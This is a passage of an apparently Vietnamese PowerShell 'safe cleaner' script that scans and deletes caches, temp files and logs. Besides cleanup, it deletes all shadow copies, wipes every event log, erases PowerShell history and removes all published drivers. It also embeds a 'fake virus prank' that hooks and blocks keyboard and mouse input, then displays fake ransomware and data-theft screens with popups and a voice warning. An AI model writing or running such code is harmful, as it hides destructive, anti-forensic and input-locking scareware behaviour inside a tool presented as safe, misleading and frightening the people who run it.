    foreach ($p in ($protected | Where-Object { $_ } | ForEach-Object { Resolve-FullPathSafe $_ })) {
        if ($full -ieq $p) { return $false }
    }
    
    # 2. Phai chua tu khoa an toan duoc phep don dep
    $safeWords = @(
        'temp','tmp','cache','caches','log','logs','crashdump','crashdumps','crashpad','reports','shader',
        'webcache','thumb','recent','wer','deliveryoptimization','fontcache','cachemanager','packages',
        'repository','pnpm-store','go-build','storage','art','minidump','livekernelreports','memory.dmp',
        'windows.old','$windows.~','store','archives','deno','npm','data','zalo','zalopc','vivaldi','roblox',
        'gog','ubisoft','panther','line','clipboard','timeline','notification','uwp','teams','coccoc',
        'prefetch','download','softwaredistribution','fntcache','installer','cryptneturlcache','postman',
        'notion','github','whatsapp','quarantine','found.000','found.001','found.002','inetpub',
        'ollama','lm-studio','gpt4all','capcut','arc_','cursor','ea desktop','rustup','miniconda3','anaconda3','webexperience',
        'local storage','indexeddb','winget','desktopappinstaller'
    )
    $lower = $full.ToLowerInvariant()
    $hasSafeWord = $false
    foreach($w in $safeWords){ 
        if($lower.Contains($w)){ $hasSafeWord = $true; break } 
    }
    if (-not $hasSafeWord) { return $false }
    
    # 3. Phai chua mot trong cac dau hieu thu muc tam de don dep
    $markers = @(
        '\Temp','\Cache','\Code Cache','\GPUCache','\CacheStorage','\Media Cache','\Storage','\D3DSCache',
        '\INetCache','\Recent','\WER','\DeliveryOptimization','\Prefetch','\Windows\Logs','\SoftwareDistribution\Download',
        '\CrashDumps','\DXCache','\GLCache','\NV_Cache','\DxCache','\shadercache','\webcache','\htmlcache','\Saved\Logs',
        '\Minidump','\LiveKernelReports','\MEMORY.DMP','\$WINDOWS.~','\Windows.old','\npm-cache','\pip\Cache',
        '\.nuget\packages','\Yarn\Cache','\pnpm-store','\Composer\Cache','\.gradle\caches','\.m2\repository',
        '\.cargo\registry\cache','\go-build','\art','\caches','\Microsoft\Windows\Explorer','\FontCache','\LocalCache',
        '\EdgeWebView','\startupCache','\Crashpad\reports','\ShaderCache','\GrShaderCache','\OfficeFileCache',
        '\OneDrive\logs','\OneDrive\setup\logs','\ComponentModelCache','\WindowsTerminal_8wekyb3d8bbwe\LocalCache',
        '\Windows Defender\Scans\History','\IconCacheToDelete','\Windows\Caches','\chocolatey','\vcpkg\archives',
        '\.cache\pip','\.cache\huggingface','\.cache\torch','\.deno','\.npm','\.bun\install\cache','\Docker\log',
        '\Docker\wsl\data','\ZaloPC','\Vivaldi','\Clipboard','\ConnectedDevicesPlatform','\Notifications','\Roblox',
        '\GOG.com','\Ubisoft','\LINE','\Panther','\FNTCACHE.DAT','\Installer','\media_cache','\CryptnetUrlCache',
        '\Postman','\Notion','\GitHub Desktop','\WhatsApp','\Quarantine','\System32\LogFiles',
        '\Found.000','\Found.001','\Found.002','\inetpub\logs',
        '\.ollama\models','\.cache\lm-studio','\GPT4All','\CapCut\User Data','\Arc_','\Cursor',
        '\EA Desktop','\.rustup\downloads','\miniconda3\pkgs','\anaconda3\pkgs','\WebExperience',
        '\logs','\Local Storage','\IndexedDB','\WinGet','\DiagOutputDir'
    )
    foreach ($m in $markers) { 
        if ($full -like "*$m*") { return $true } 
    }
    
    return $false
}

function Get-ChromiumCachePaths {
    param([array]$Roots)
    $paths = @()
    foreach ($root in $Roots) {
        if (Test-Path $root -ErrorAction SilentlyContinue) {
            Get-ChildItem $root -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -match '^(Default|Profile \d+|Guest Profile|System Profile)$' } | ForEach-Object {
                foreach ($sub in @('Cache','Code Cache','GPUCache','Service Worker\CacheStorage','Media Cache')) {
                    $p = Join-Path $_.FullName $sub
                    if (Test-Path $p -ErrorAction SilentlyContinue) { $paths += $p }
                }
            }
        }
    }
    $paths
}

function Get-FirefoxCachePaths {
    param([array]$Roots)
    $paths = @()
    foreach ($root in $Roots) {
        if (Test-Path $root -ErrorAction SilentlyContinue) {
            Get-ChildItem $root -Directory -ErrorAction SilentlyContinue | ForEach-Object {
                foreach ($sub in @('cache2','startupCache','OfflineCache')) {
                    $p = Join-Path $_.FullName $sub
                    if (Test-Path $p -ErrorAction SilentlyContinue) { $paths += $p }
                }
            }
        }
    }
    $paths
}

function Get-OperaCachePaths {
    param([array]$Roots)
    $paths = @()
    foreach ($root in $Roots) {
        if (Test-Path $root -ErrorAction SilentlyContinue) {
            Get-ChildItem $root -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'Opera*' } | ForEach-Object {
                foreach ($sub in @('Cache','Code Cache','GPUCache','Service Worker\CacheStorage','Media Cache')) {
                    $p = Join-Path $_.FullName $sub
                    if (Test-Path $p -ErrorAction SilentlyContinue) { $paths += $p }
                }
            }
        }
    }
    $paths
}

function Get-DynamicAppCachePaths {
    param([array]$Roots)
    $paths = @()
    foreach ($root in $Roots) {
        $loc = Join-Path $root 'AppData\Local'
        $roam = Join-Path $root 'AppData\Roaming'
        foreach ($base in @($loc, $roam)) {
            if (Test-Path $base -ErrorAction SilentlyContinue) {
                Get-ChildItem $base -Directory -ErrorAction SilentlyContinue | ForEach-Object {
                    $appFolder = $_.FullName
                    if ($_.Name -match '^(Microsoft|Windows|Packages)$') { return }
                    Get-ChildItem $appFolder -Directory -ErrorAction SilentlyContinue | Where-Object {
                        $_.Name -match '^(Cache|Caches|Code Cache|GPUCache|logs)$'
                    } | ForEach-Object {
                        $paths += $_.FullName
                    }
                }
            }
        }
    }
    $paths
}

function Get-TargetPaths {
    param($Target)
    switch ($Target.Type) {
        'ChromiumCache' { @(Get-ChromiumCachePaths $Target.Paths) }
        'FirefoxCache' { @(Get-FirefoxCachePaths $Target.Paths) }
        'OperaCache' { @(Get-OperaCachePaths $Target.Paths) }
        'DynamicAppCache' { @(Get-DynamicAppCachePaths (Get-UserRoots)) }
        'MultiPath' { @(Expand-PathListFlat $Target.Paths | Where-Object { $_ -and (Test-Path $_ -ErrorAction SilentlyContinue) }) }
        default { if ($Target.Path) { @($Target.Path) } else { @() } }
    }
}

function Get-ItemsForPath {
    param([string]$Path,[int]$MinAgeHours=0,[string[]]$Extensions=@())
    if (-not (Test-Path $Path -ErrorAction SilentlyContinue)) { return @() }
    if (-not (Test-PathAllowedForCleanup $Path)) { Write-Log "BLOCKED unsafe path: $Path"; return @() }
    $cutoff = (Get-Date).AddHours(-1 * $MinAgeHours)
    if ($Extensions.Count -gt 0) {
        $items = Get-ChildItem $Path -Recurse -File -Force -ErrorAction SilentlyContinue | Where-Object { $Extensions -contains $_.Extension.ToLowerInvariant() }
    } else {
        $items = Get-ChildItem $Path -Force -ErrorAction SilentlyContinue
    }
    if ($MinAgeHours -gt 0) { $items = $items | Where-Object { $_.LastWriteTime -lt $cutoff } }
    @($items)
}

function Get-PathSizeFromItems {
    param([array]$Items)
    $size = 0L
    $file = 0
    foreach ($item in $Items) {
        try {
            if ($item.PSIsContainer) {
                $child = Get-ChildItem -LiteralPath $item.FullName -Recurse -File -Force -ErrorAction SilentlyContinue
                if ($child) {
                    $m = $child | Measure-Object Length -Sum
                    $size += [long]$m.Sum
                    $file += $child.Count
                }
            } else {
                $size += [long]$item.Length
                $file++
            }
        } catch {}
    }
    @{Size=$size;FileCount=$file;ItemCount=@($Items).Count}
}

function Get-RecycleBinSize {
    $r = @{Size=0L;FileCount=0;ItemCount=0}
    try {
        Get-PSDrive -PSProvider FileSystem | ForEach-Object {
            $p = Join-Path $_.Root '$Recycle.Bin'
            if (Test-Path $p -ErrorAction SilentlyContinue) {
                $f = Get-ChildItem $p -Recurse -File -Force -ErrorAction SilentlyContinue
                if ($f) {
                    $m = $f | Measure-Object Length -Sum
                    $r.Size += [long]$m.Sum
                    $r.FileCount += $f.Count
                    $r.ItemCount += $f.Count
                }
            }
        }
    } catch {}
    $r
}

function Get-TargetScanResult {
    param($Target)
    if ($Target.Type -eq 'RecycleBin') { return Get-RecycleBinSize }
    if ($Target.Type -eq 'DISM') { return @{Size=0L;FileCount=0;ItemCount=0;Note='DISM tinh khi chay'} }
    if ($Target.Type -eq 'DriverStore') { return @{Size=0L;FileCount=0;ItemCount=0;Note='Quet Driver cu khi chay'} }
    if ($Target.Type -eq 'Hibernation') { 
        if (Test-Path 'C:\hiberfil.sys') { 
            $s = (Get-Item 'C:\hiberfil.sys').Length
            return @{Size=$s;FileCount=1;ItemCount=1;Note='Tep hiberfil.sys'} 
        } else { return @{Size=0L;FileCount=0;ItemCount=0;Note='Khong tim thay/Da tat'} }
    }
    if ($Target.Type -eq 'EventLogs') { return @{Size=0L;FileCount=0;ItemCount=0;Note='Xoa toan bo nhat ky su kien'} }
    if ($Target.Type -eq 'ShadowCopies') { return @{Size=0L;FileCount=0;ItemCount=0;Note='Xoa System Restore Points'} }
    if ($Target.Type -eq 'NetworkCache') { return @{Size=0L;FileCount=0;ItemCount=0;Note='Xoa bo nho dem mang'} }
    if ($Target.Type -eq 'DeliveryOpt') { return @{Size=0L;FileCount=0;ItemCount=0;Note='Xoa Delivery Optimization Cache'} }
    if ($Target.Type -eq 'BranchCache') { return @{Size=0L;FileCount=0;ItemCount=0;Note='Xoa BranchCache'} }
    if ($Target.Type -eq 'PowerShellHistory') { return @{Size=0L;FileCount=0;ItemCount=0;Note='Xoa lich su PowerShell'} }
    
    $total = @{Size=0L;FileCount=0;ItemCount=0}
    $ext = if ($Target.Type -eq 'WindowsLogs') { @('.log','.tmp','.etl') } else { @() }
    
    foreach ($path in (Get-TargetPaths $Target)) {
        $x = Get-PathSizeFromItems (Get-ItemsForPath $path ([int]$Target.MinAgeHours) $ext)
        $total.Size += $x.Size
        $total.FileCount += $x.FileCount
        $total.ItemCount += $x.ItemCount
    }
    $total
}

function Fit-Text {
    param([string]$Text,[int]$Width)
    if ($null -eq $Text) { $Text = '' }
    if ($Text.Length -le $Width) { return $Text }
    if ($Width -le 3) { return $Text.Substring(0,$Width) }
    return $Text.Substring(0,$Width-3) + '...'
}

function Show-Banner {
    Clear-Host
    Write-Host ''
    Write-Host '    ========================================================================' -ForegroundColor Cyan
    Write-Host '      *** TRINH DON DEP HE THONG AN TOAN - POWER CLEANER ***' -ForegroundColor Cyan
    Write-Host '    ========================================================================' -ForegroundColor Cyan
    Write-Host ''
    Write-Host "      Phien ban: v$Script:Version | Thoi gian: $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" -ForegroundColor Yellow
    if (Test-AdminRights) {
        Write-Host "      Quyen bao mat: [ ADMINISTRATOR - DA MO KHOA TAT CA TINH NANG ]" -ForegroundColor Green
    } else {
        Write-Host "      Quyen bao mat: [ THANH VIEN - VUI LONG CAP QUYEN DE DON SAU HON ]" -ForegroundColor Yellow
    }
    Write-Host '      Tieu chi: Khong xoa tep ca nhan - Khong loi Win - Khong ruom ra' -ForegroundColor DarkCyan
    Write-Host '    ========================================================================' -ForegroundColor Magenta
    Write-Host ''
}

function Show-Menu {
    Write-Host '    [*] CHON CHE DO DON DEP:' -ForegroundColor Cyan
    Write-Host '      [1]  Don dep Toan Dien (Quyen Admin Cao Nhat)' -ForegroundColor Red
    Write-Host ''
    Write-Host '    [*] TOI UU & SUA LOI HE THONG (NANG CAO):' -ForegroundColor Cyan
    Write-Host '      [2]  Toi uu hoa Mang & WiFi (Giam Ping, Chong Lag)' -ForegroundColor White
    Write-Host '      [3]  Sua loi File He Thong (SFC & DISM RestoreHealth)' -ForegroundColor White
    Write-Host '      [4]  Reset Mang Toan Dien (Sua loi mat mang Nang)' -ForegroundColor White
    Write-Host '      [5]  Toi uu Hieu suat Choi Game (Gaming Tweaks)' -ForegroundColor White
    Write-Host '      [6]  Bat che do Sieu Hieu Nang (Ultimate Power Plan)' -ForegroundColor White
    Write-Host '      [7]  Tat Theo doi & Dich vu ngam rac (Disable Telemetry)' -ForegroundColor White
    Write-Host '      [8]  Xoa Ung dung rac cai san (Safe Debloat Bloatware)' -ForegroundColor White
    Write-Host '      [9]  Tat Bing Search & Cortana (Tang toc Start Menu)' -ForegroundColor White
    Write-Host '      [10] Toi uu hoa & TRIM O cung (SSD/HDD Optimize)' -ForegroundColor White
    Write-Host '      [11] Toi uu Giao dien & Trai nghiem (UI/UX, FPS)' -ForegroundColor White
    Write-Host '      [12] Toi uu Bao mat & Quyen rieng tu (Privacy, RAM)' -ForegroundColor White
    Write-Host '      [13] Toi uu Nguon & Luu tru (Fast Startup, Hibernate)' -ForegroundColor White
    Write-Host '      [14] Nen o dia ao WSL2 (Compact WSL)' -ForegroundColor White
    Write-Host '      [15] Khoi dong lai Windows Explorer (Fix loi RAM)' -ForegroundColor White
    Write-Host '      [16] Khoi phuc & Xoa trang Windows Update (Hard Reset)' -ForegroundColor White
    Write-Host '      [17] Nen he dieu hanh Windows (Compact OS)' -ForegroundColor White
    Write-Host '      [18] Tao diem phuc hoi Windows (Restore Point)' -ForegroundColor White
    Write-Host ''
    Write-Host '    [*] LICH TRINH & BAO CAO:' -ForegroundColor Cyan
    Write-Host '      [19] Dat lich don dep hang tuan' -ForegroundColor White
    Write-Host '      [20] Dat lich quet rac hang ngay' -ForegroundColor White
    Write-Host '      [21] Xem trang trang lich trinh tu dong' -ForegroundColor White
    Write-Host '      [22] Go bo hoan toan lich tu dong' -ForegroundColor White
    Write-Host ''
    Write-Host '      [0]  Thoat chuong trinh' -ForegroundColor DarkGray
    Write-Host '    ========================================================================' -ForegroundColor Magenta
    Write-Host ''
}

function Show-ProgressBar {
    param([int]$Current,[int]$Total,[string]$Activity='Dang xu ly')
    if($Total -le 0){$Total=1}
    $pct = [math]::Min(100,[math]::Round(($Current/$Total)*100))
    $len = 30
    $fill = [math]::Round($len*$pct/100)
    Write-Host ("`r    $Activity ["+('#'*$fill)+('-'*($len-$fill))+"] $pct%   ") -NoNewline
    if($Current -eq $Total){Write-Host ''}
}

function Get-IdsByMode { param([string[]]$Modes) @($Script:CleanupTargets | Where-Object { $Modes -contains $_.Mode } | ForEach-Object { [int]$_.Id }) }

function Invoke-Scan {
    param([int[]]$TargetIds=@())
    $targets = if($TargetIds.Count){$Script:CleanupTargets|Where-Object{$TargetIds -contains $_.Id}}else{$Script:CleanupTargets}
    $admin = Test-AdminRights
    $res = @()
    $i = 0
    foreach($t in $targets){
        $i++
        Show-ProgressBar $i @($targets).Count "Quet: $(Fit-Text $t.Name 20)"
        if($t.RequireAdmin -and -not $admin){
            $res += [pscustomobject]@{Id=$t.Id;Mode=$t.Mode;Name=$t.Name;Size=0L;FileCount=0;Skipped=$true;Note='Can quyen Admin'}
            continue
        }
        $x = Get-TargetScanResult $t
        $res += [pscustomobject]@{Id=$t.Id;Mode=$t.Mode;Name=$t.Name;Size=[long]$x.Size;FileCount=[int]$x.FileCount;Skipped=$false;Note=$x.Note}
    }
    Write-Host ''
    $Script:LastScan = $res
    $res
}

function Show-ScanResults {
    param([array]$Results)
    $total = 0L
    $file = 0
    Write-Host ''
    Write-Host '    +----+-------------+-----------------------------------+--------------+----------+' -ForegroundColor DarkCyan
    Write-Host '    | ID | Che do      | Ten muc don dep                   | Dung luong   | Tep tin  |' -ForegroundColor DarkCyan
    Write-Host '    +----+-------------+-----------------------------------+--------------+----------+' -ForegroundColor DarkCyan
    foreach($r in $Results){
        $total += $r.Size
        $file += $r.FileCount
        $size = if($r.Skipped){'BO QUA (Admin)'}else{Format-FileSize $r.Size}
        Write-Host ("    | {0,2} | {1,-11} | {2,-33} | {3,-12} | {4,8} |" -f $r.Id,$r.Mode,(Fit-Text $r.Name 33),$size,$r.FileCount)
    }
    Write-Host '    +----+-------------+-----------------------------------+--------------+----------+' -ForegroundColor DarkCyan
    Write-Host ("    Tong dung luong co the don dep: {0} / {1} tep tin" -f (Format-FileSize $total),$file) -ForegroundColor Green
    Write-Host ''
    @{TotalSize=$total;TotalFiles=$file}
}

function Show-RunningAppWarnings {
    $names = @('chrome','msedge','firefox','brave','opera','discord','teams','code','steam','slack','telegram','zoom','spotify','EpicGamesLauncher','Battle.net','vivaldi','zalo')
    $running = @()
    foreach($n in $names){ if(Get-Process -Name $n -ErrorAction SilentlyContinue){$running+=$n} }
    if($running.Count){
        Write-Host "    Cac ung dung sau dang mo: $($running -join ', ')" -ForegroundColor Yellow
        Write-Host '    Khuyen dung: Dong ung dung truoc khi don de giai phong duoc nhieu cache hon.' -ForegroundColor DarkYellow
    }
}

function Remove-SafeItems {
    param([string]$Path,[int]$MinAgeHours=0,[string[]]$Extensions=@())
    $deleted = 0
    foreach($item in (Get-ItemsForPath $Path $MinAgeHours $Extensions)){
        try{
            Remove-Item -LiteralPath $item.FullName -Recurse -Force -ErrorAction SilentlyContinue
            $deleted++
        }catch{}
    }
    $deleted
}

function Invoke-Clean {
    param([int[]]$TargetIds)
    $admin = Test-AdminRights
    $total = 0L
    $file = 0
    $i = 0
    Write-Log '=== BAT DAU DON DEP HE THONG ==='
    foreach($id in $TargetIds){
        $t = $Script:CleanupTargets | Where-Object {$_.Id -eq $id}
        if(-not $t){continue}
        $i++
        if($t.RequireAdmin -and -not $admin){
            Write-Host "    [BO QUA] $($t.Name) - Yeu cau quyen Admin" -ForegroundColor DarkYellow
            continue
        }
        Show-ProgressBar $i $TargetIds.Count "Don: $(Fit-Text $t.Name 20)"
        $before = Get-TargetScanResult $t
        $deleted = 0
        try{
            switch($t.Type){
                'RecycleBin'{Clear-RecycleBin -Force -ErrorAction SilentlyContinue; $deleted=$before.FileCount}
                'DISM'{dism.exe /Online /Cleanup-Image /StartComponentCleanup /ResetBase | Out-Null; $deleted=1}
                'DriverStore'{ 
                    $drvs = pnputil /enum-drivers | Select-String "Published Name:" | ForEach-Object { ($_.Line -split ":")[1].Trim() }
                    foreach($d in $drvs){ pnputil /delete-driver $d | Out-Null }
                    $deleted = $drvs.Count 
                }
                'Hibernation'{ powercfg.exe /hibernate off | Out-Null; $deleted=1 }
                'EventLogs'{ wevtutil el | ForEach-Object { wevtutil cl "$_" 2>$null }; $deleted=1 }
                'ShadowCopies'{ vssadmin delete shadows /all /quiet | Out-Null; $deleted=1 }
                'NetworkCache'{ Clear-DnsClientCache -ErrorAction SilentlyContinue; ipconfig /flushdns | Out-Null; netsh interface ip delete arpcache | Out-Null; $deleted=1 }
                'DeliveryOpt'{ if (Get-Command Clear-DeliveryOptimizationCache -ErrorAction SilentlyContinue) { Clear-DeliveryOptimizationCache -Force -ErrorAction SilentlyContinue }; $deleted=1 }
                'BranchCache'{ if (Get-Command Clear-BCCache -ErrorAction SilentlyContinue) { Clear-BCCache -Force -ErrorAction SilentlyContinue }; $deleted=1 }
                'PowerShellHistory'{ 
                    $h = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath
                    if ($h -and (Test-Path $h)) { Remove-Item $h -Force -ErrorAction SilentlyContinue; $deleted=1 }
                }
                'WindowsLogs'{foreach($p in (Get-TargetPaths $t)){$deleted+=Remove-SafeItems $p ([int]$t.MinAgeHours) @('.log','.tmp','.etl')}}
                default{foreach($p in (Get-TargetPaths $t)){$deleted+=Remove-SafeItems $p ([int]$t.MinAgeHours)}}
            }
            $total += $before.Size
            $file += $before.FileCount
            Write-Host "    [OK] $($t.Name): $(Format-FileSize $before.Size)" -ForegroundColor Green
            Write-Log "DON THANH CONG: $($t.Name) - Giai phong $(Format-FileSize $before.Size) - So tep=$($before.FileCount) - Da xoa=$deleted"
        }catch{
            Write-Host "    [LOI] $($t.Name): $($_.Exception.Message)" -ForegroundColor Red
            Write-Log "LOI DON DEP: $($t.Name) - $($_.Exception.Message)"
        }
    }
    Write-Host "`n    Hoan tat: Da giai phong $(Format-FileSize $total) / $file tep tin" -ForegroundColor Green
    Write-Log "Hoan thanh don dep. Tong giai phong: $(Format-FileSize $total) - Tong so tep: $file"
    Write-Log '---'
}

function Confirm-And-Clean {
    param([int[]]$Ids,[string]$Title)
    Show-Banner
    Write-Host "    $Title" -ForegroundColor Yellow
    Show-RunningAppWarnings
    $r = Invoke-Scan $Ids
    $s = Show-ScanResults $r
    if($ScanOnly){return}
    if($s.TotalSize -le 0 -and -not ($r|Where-Object{$_.Name -eq 'Don dep thanh phan DISM'})){
        Write-Host '    Khong phat hien rac can don dep.' -ForegroundColor Green
        return
    }
    if(-not $Yes){
        if(-not (Confirm-YN 'Ban co chac chan muon xoa toan bo bo nho dem / tep tam da quet khong?')){
            Write-Host '    Da huy bo thao tac.' -ForegroundColor DarkGray
            return
        }
    }
    $clean = @($r | Where-Object{-not $_.Skipped -and ($_.Size -gt 0 -or $_.Name -eq 'Don dep thanh phan DISM')}|ForEach-Object{$_.Id})
    if($clean.Count){
        Invoke-Clean $clean
        Write-Host '    Don dep hoan tat an toan. Khong co tep ca nhan nao nam ngoai danh sach quet bi tac dong.' -ForegroundColor Green
    }
}

function Invoke-DisableInput {
    param([int]$Seconds = 30)
    $code = @"
using System;
using System.Runtime.InteropServices;
public class InputBlocker {
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
}
"@
    if (-not ('InputBlocker' -as [type])) {
        Add-Type -TypeDefinition $code -Language CSharp -ErrorAction SilentlyContinue
    }
    
    try {
        [InputBlocker]::BlockInput($true) | Out-Null
        Start-Sleep -Seconds $Seconds
    } finally {
        [InputBlocker]::BlockInput($false) | Out-Null
    }
}



function Invoke-SafeFakeVirusPrank {
    param([int]$Seconds = 30)
    $oldTitle = $Host.UI.RawUI.WindowTitle
    $oldFg = $Host.UI.RawUI.ForegroundColor
    $oldBg = $Host.UI.RawUI.BackgroundColor
    $oldCursor = $Host.UI.RawUI.CursorSize

    # Use Low-Level Hooks and Window maximizing
    $code = @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class HackerPrank {
    public delegate IntPtr LowLevelHookProc(int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelHookProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();

    private static IntPtr _mouseHookID = IntPtr.Zero;
    private static IntPtr _kbdHookID = IntPtr.Zero;
    private static LowLevelHookProc _mouseProc = MouseHookCallback;
    private static LowLevelHookProc _kbdProc = KbdHookCallback;

    public static void Block() {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule) {
            IntPtr modHandle = GetModuleHandle(curModule.ModuleName);
            if (_mouseHookID == IntPtr.Zero)
                _mouseHookID = SetWindowsHookEx(14, _mouseProc, modHandle, 0); // WH_MOUSE_LL
            if (_kbdHookID == IntPtr.Zero)
                _kbdHookID = SetWindowsHookEx(13, _kbdProc, modHandle, 0); // WH_KEYBOARD_LL
        }
        ShowWindow(GetConsoleWindow(), 3); // Maximize
    }

    public static void Unblock() {
        if (_mouseHookID != IntPtr.Zero) {
            UnhookWindowsHookEx(_mouseHookID);
            _mouseHookID = IntPtr.Zero;
        }
        if (_kbdHookID != IntPtr.Zero) {
            UnhookWindowsHookEx(_kbdHookID);
            _kbdHookID = IntPtr.Zero;
        }
        ShowWindow(GetConsoleWindow(), 1); // Normal restore
    }

    private static IntPtr MouseHookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0) return (IntPtr)1;
        return CallNextHookEx(_mouseHookID, nCode, wParam, lParam);
    }
    private static IntPtr KbdHookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0) return (IntPtr)1;
        return CallNextHookEx(_kbdHookID, nCode, wParam, lParam);
    }
}
"@
    if (-not ('HackerPrank' -as [type])) {
        Add-Type -TypeDefinition $code -Language CSharp -ErrorAction SilentlyContinue
    }
    Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue

    $skull = @"
                 .      .      .      .
                  .    .      .     .
                   .  .      .    .
                    ..      .   .
           _        _..-.._      _
         .' \     .'       '.   / `.
        /   /    /           \  \   \
       /   /    |             |  \   \
      |   /     |             |   \   |
      |  |      |             |    |  |
      |   \     \             /   /   |
       \   \     '.         .'   /   /
        \   \      '--...--'    /   /
         '.  \                 /  .'
           '._                 _.'
              '-.._________..-'
                | | | | | | |
                |_|_|_|_|_|_|
                
      >>> SYSTEM COMPROMISED <<<
"@

    $rnd = [Random]::new()
    $end = (Get-Date).AddSeconds($Seconds)
    
    $sysFiles = @("hal.dll", "ntoskrnl.exe", "lsass.exe", "smss.exe", "winlogon.exe", "explorer.exe", "cmd.exe", "svchost.exe", "services.exe", "csrss.exe", "kernel32.dll", "user32.dll", "shell32.dll", "advapi32.dll", "rpcrt4.dll", "ws2_32.dll", "crypt32.dll", "wininet.dll", "urlmon.dll")
    
    try {
        [HackerPrank]::Block()
        $Host.UI.RawUI.WindowTitle = 'CRITICAL SYSTEM FAILURE - MALWARE INFECTION DETECTED'
        $Host.UI.RawUI.BackgroundColor = 'Black'
        $Host.UI.RawUI.ForegroundColor = 'Red'
        Clear-Host
        
        # 1. Show Skull
        Write-Host $skull -ForegroundColor Red
        Write-Host "`n[!] CRITICAL: UNAUTHORIZED REMOTE ACCESS DETECTED (IP: 185.15.42.109)" -ForegroundColor Yellow
        Write-Host "[!] INITIATING SYSTEM LOCKDOWN AND DATA EXFILTRATION..." -ForegroundColor Yellow
        
        # Voice Warning (Async)
        $codeSp = "`$v = New-Object -ComObject SAPI.SpVoice; `$v.Speak('Warning. System compromised. Data is being encrypted.', 1);"
        Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -Command `"$codeSp`"" -ErrorAction SilentlyContinue

        $sleepEnd1 = (Get-Date).AddSeconds(3)
        while ((Get-Date) -lt $sleepEnd1) { [System.Windows.Forms.Application]::DoEvents(); Start-Sleep -Milliseconds 10 }
        
        # 2. Fake Hex Dump
        Clear-Host
        Write-Host "DUMPING MEMORY TO REMOTE SERVER..." -ForegroundColor Red
        $hexStart = (Get-Date)
        while ((Get-Date) -lt $hexStart.AddSeconds(5)) {
            $hexLine = "0x{0:X8}  " -f $rnd.Next(0, 0xFFFFFFFF)
            for ($i = 0; $i -lt 8; $i++) { $hexLine += "{0:X4} " -f $rnd.Next(0, 0xFFFF) }
            $hexLine += "  *" + (-join (1..16 | ForEach-Object { [char]$rnd.Next(33, 126) })) + "*"
            Write-Host $hexLine -ForegroundColor DarkGreen
            [System.Windows.Forms.Application]::DoEvents()
            Start-Sleep -Milliseconds 10
        }
        
        # 3. Fake File Theft
        Clear-Host
        Write-Host "EXTRACTING SENSITIVE DATA AND PASSWORDS..." -ForegroundColor Red
        $theftStart = (Get-Date)
        while ((Get-Date) -lt $theftStart.AddSeconds(5)) {
            $f = $sysFiles[$rnd.Next($sysFiles.Count)]
            $path = "C:\Windows\System32\$f"
            if ($rnd.Next(10) -gt 6) { $path = "C:\Users\Admin\Documents\passwords.txt" }
            if ($rnd.Next(10) -gt 8) { $path = "C:\Users\Admin\AppData\Local\Google\Chrome\User Data\Default\Login Data" }
            Write-Host "Uploading: $path ... [SUCCESS] (100%)" -ForegroundColor Yellow
            [System.Windows.Forms.Application]::DoEvents()
            Start-Sleep -Milliseconds 40
        }

        # Popups (Fake Error messages)
        $codePopup = "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('YOUR SYSTEM HAS BEEN INFECTED BY RANSOMWARE.', 'CRITICAL ERROR', 0, 16);"
        for ($i=0; $i -lt 4; $i++) {
            Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -Command `"$codePopup`"" -ErrorAction SilentlyContinue
        }
        
        # 4. Matrix / Encryption loop
        Clear-Host
        $chars = '01#$%&@ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray()
        $msgIndex = 0
        $messages = @(
            'ENCRYPTING MFT TABLE...',
            'OVERWRITING BOOT SECTOR...',
            'DISABLING FIREWALL AND ANTIVIRUS...',
            'CORRUPTING REGISTRY KEYS...',
            'WIPING SYSTEM RESTORE POINTS...',
            'FORMATTING DRIVE D: ... FAILED',
            'SENDING KEYLOGGER LOGS TO SERVER...'
        )
        
        while((Get-Date) -lt $end){
            [System.Windows.Forms.Application]::DoEvents()
            $rem = [math]::Round(($end - (Get-Date)).TotalSeconds)
            
            $w = [Math]::Max(30, [Math]::Min(95, $Host.UI.RawUI.WindowSize.Width - 4))
            $line = -join (1..$w | ForEach-Object { $chars[$rnd.Next(0,$chars.Length)] })
            
            if ($rnd.Next(0, 100) -lt 80) {
                Write-Host ('    ' + $line) -ForegroundColor Green
            } else {
                $msg = $messages[$msgIndex % $messages.Count]
                Write-Host "`n    [!] $msg" -ForegroundColor Red
                Write-Host "    [!] SYSTEM DESTRUCTION IN $rem SECONDS...`n" -ForegroundColor Yellow
                $msgIndex++
                
                $sleepEnd2 = (Get-Date).AddMilliseconds(200)
                while ((Get-Date) -lt $sleepEnd2) { [System.Windows.Forms.Application]::DoEvents(); Start-Sleep -Milliseconds 10 }
            }
            
            $sleepEnd3 = (Get-Date).AddMilliseconds(30)
            while ((Get-Date) -lt $sleepEnd3) { [System.Windows.Forms.Application]::DoEvents(); Start-Sleep -Milliseconds 5 }
        }
    } finally {
        [HackerPrank]::Unblock()
        # Kill popup powershells
